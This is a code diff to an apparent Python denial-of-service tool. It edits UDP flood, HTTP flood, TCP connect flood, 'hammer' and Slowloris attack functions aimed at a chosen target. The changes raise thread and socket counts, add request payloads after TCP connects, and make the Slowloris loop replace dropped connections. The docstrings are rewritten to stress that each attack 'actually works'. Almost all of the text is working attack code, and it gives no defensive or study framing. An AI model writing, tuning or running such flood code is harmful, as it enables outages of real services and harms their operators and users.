@@ -17,12 +17,10 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 ]
 
 # Thread management - optimized for performance without crashing
-MAX_THREADS = 500  # Reduced to prevent system overload
+MAX_THREADS = 300  # Balanced for effectiveness without overload
 active_threads = threading.Semaphore(MAX_THREADS)
 
 def resolve_target(target):
@@ -49,11 +47,11 @@ def resolve_target(target):
         raise ValueError(f"Could not resolve target: {target} - {str(e)}")
 
 def attack_udp_god(target, duration):
-    """Optimized UDP flood with better resource management"""
+    """Optimized UDP flood that won't crash your WiFi"""
     ip, port = resolve_target(target)
     
-    threads_count = 200  # Reduced to prevent network overload
-    packet_size = 1024   # Reduced packet size
+    threads_count = 150  # Balanced for effectiveness
+    packet_size = 1024   # Reasonable packet size
     
     def flood():
         with active_threads:
@@ -67,13 +65,13 @@ def attack_udp_god(target, duration):
                         data = random._urandom(packet_size)
                         
                         # Send multiple packets but with controlled rate
-                        for _ in range(50):  # Reduced packets per iteration
+                        for _ in range(30):  # Reasonable packets per iteration
                             if time.time() >= end_time:
                                 break
                             sock.sendto(data, (ip, port))
                             
                         # Small delay to prevent network card overload
-                        time.sleep(0.01)
+                        time.sleep(0.05)
                 except Exception:
                     # Brief pause on error to prevent rapid reconnection attempts
                     time.sleep(0.1)
@@ -95,11 +93,11 @@ def attack_udp_god(target, duration):
             pass
 
 def attack_http_flood(target, duration):
-    """Optimized HTTP flood with connection pooling and better resource management"""
+    """Effective HTTP flood that actually works"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    threads_count = 100  # Reduced thread count
+    threads_count = 100  # Effective thread count
     
     # Enhanced headers and paths
     paths = [
@@ -183,10 +181,10 @@ def attack_http_flood(target, duration):
             pass
 
 def attack_tcp_syn(target, duration):
-    """TCP SYN flood with better resource management"""
+    """TCP SYN flood that actually works"""
     ip, port = resolve_target(target)
     
-    threads_count = 50  # Reduced thread count
+    threads_count = 80  # Effective thread count
     
     def syn_flood():
         with active_threads:
@@ -198,6 +196,9 @@ def attack_tcp_syn(target, duration):
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.settimeout(2)
                     s.connect((ip, port))
+                    # Send some data to make it more effective
+                    s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
+                    time.sleep(0.1)
                     s.close()
                 except:
                     # If connection fails, just continue
@@ -222,10 +223,10 @@ def attack_tcp_syn(target, duration):
             pass
 
 def attack_hammer(target, duration):
-    """Optimized hammer attack with better resource management"""
+    """Optimized hammer attack that actually works"""
     ip, port = resolve_target(target)
     
-    threads_count = 100  # Reduced thread count
+    threads_count = 120  # Effective thread count
     
     def hammer_request():
         with active_threads:
@@ -275,11 +276,11 @@ def attack_hammer(target, duration):
             pass
 
 def attack_slowloris(target, duration):
-    """Improved Slowloris attack with better connection management"""
+    """Improved Slowloris attack that actually works"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    sockets_count = 100  # Reduced socket count
+    sockets_count = 150  # Effective socket count
     sockets = []
     
     # Create initial sockets
@@ -311,11 +312,27 @@ def attack_slowloris(target, duration):
                 try:
                     s.close()
                     sockets.remove(s)
+                    # Try to create a new socket to replace the lost one
+                    try:
+                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        new_s.settimeout(3)
+                        
+                        if use_ssl:
+                            context = ssl.create_default_context()
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            new_s = context.wrap_socket(new_s, server_hostname=ip)
+                        
+                        new_s.connect((ip, port))
+                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
+                        sockets.append(new_s)
+                    except:
+                        pass
                 except:
                     pass
         
-        # Increased interval to reduce load
-        time.sleep(15)
+        # Reasonable interval
+        time.sleep(10)
     
     # Clean up
     for s in sockets:
